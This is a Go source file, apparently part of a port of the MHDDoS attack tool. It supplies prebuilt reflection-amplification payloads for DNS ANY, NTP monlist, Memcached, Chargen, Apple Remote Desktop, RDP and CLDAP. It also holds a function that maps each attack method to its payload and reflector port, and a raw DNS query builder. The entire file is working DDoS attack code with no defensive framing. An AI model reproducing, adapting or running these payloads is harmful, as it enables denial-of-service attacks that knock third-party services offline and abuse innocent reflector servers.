package proto

import (
	"encoding/binary"
	mrand "math/rand"
)

// DNSQuery builds a raw DNS query packet for the given domain and qtype.
// qtype: 1=A, 28=AAAA, 255=ANY (best for AMP).
func DNSQuery(domain string, qtype uint16) []byte {
	id := uint16(mrand.Intn(65535))

	// Header: ID flags qdcount ancount nscount arcount
	hdr := make([]byte, 12)
	binary.BigEndian.PutUint16(hdr[0:], id)
	binary.BigEndian.PutUint16(hdr[2:], 0x0100) // standard query, recursion desired
	binary.BigEndian.PutUint16(hdr[4:], 1)      // 1 question
	// rest zero

	// Question section: encoded domain
	question := encodeDomain(domain)
	question = append(question, 0x00) // root label
	qt := make([]byte, 4)
	binary.BigEndian.PutUint16(qt[0:], qtype) // QTYPE
	binary.BigEndian.PutUint16(qt[2:], 1)     // QCLASS IN

	return append(append(hdr, question...), qt...)
}

// DNSAMPPayload returns the AMP amplification DNS ANY payload (pre-built).
// Equivalent to the Python MHDDoS DNS payload.
func DNSAMPPayload() []byte {
	return []byte(
		"\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00" +
			"\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00",
	)
}

// NTPAMPPayload returns the NTP monlist amplification payload.
func NTPAMPPayload() []byte {
	return []byte("\x17\x00\x03\x2a\x00\x00\x00\x00")
}

// MemcachedAMPPayload returns the Memcached amplification payload.
func MemcachedAMPPayload() []byte {
	return []byte("\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n")
}

// ChargenAMPPayload returns the Chargen amplification payload.
func ChargenAMPPayload() []byte { return []byte("\x01") }

// ARDAMPPayload returns the Apple Remote Desktop amplification payload.
func ARDAMPPayload() []byte { return []byte("\x00\x14\x00\x00") }

// RDPAMPPayload returns the RDP amplification payload.
func RDPAMPPayload() []byte {
	return []byte("\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00")
}

// CLDAPAMPPayload returns the CLDAP amplification payload.
func CLDAPAMPPayload() []byte {
	return []byte(
		"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00" +
			"\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65" +
			"\x63\x74\x63\x6c\x61\x73\x73\x30\x00",
	)
}

// AMPPayloadForMethod returns the AMP payload and reflector port for a given method name.
func AMPPayloadForMethod(method string) (payload []byte, port uint16, ok bool) {
	switch method {
	case "DNS":
		return DNSAMPPayload(), 53, true
	case "NTP":
		return NTPAMPPayload(), 123, true
	case "MEM":
		return MemcachedAMPPayload(), 11211, true
	case "CHAR":
		return ChargenAMPPayload(), 19, true
	case "ARD":
		return ARDAMPPayload(), 3283, true
	case "RDP":
		return RDPAMPPayload(), 3389, true
	case "CLDAP":
		return CLDAPAMPPayload(), 389, true
	}
	return nil, 0, false
}

func encodeDomain(domain string) []byte {
	out := make([]byte, 0, 64)
	for _, label := range splitDomain(domain) {
		out = append(out, byte(len(label)))
		out = append(out, []byte(label)...)
	}
	return out
}

func splitDomain(domain string) []string {
	var labels []string
	start := 0
	for i := 0; i <= len(domain); i++ {
		if i == len(domain) || domain[i] == '.' {
			if i > start {
				labels = append(labels, domain[start:i])
			}
			start = i + 1
		}
	}
	return labels
}
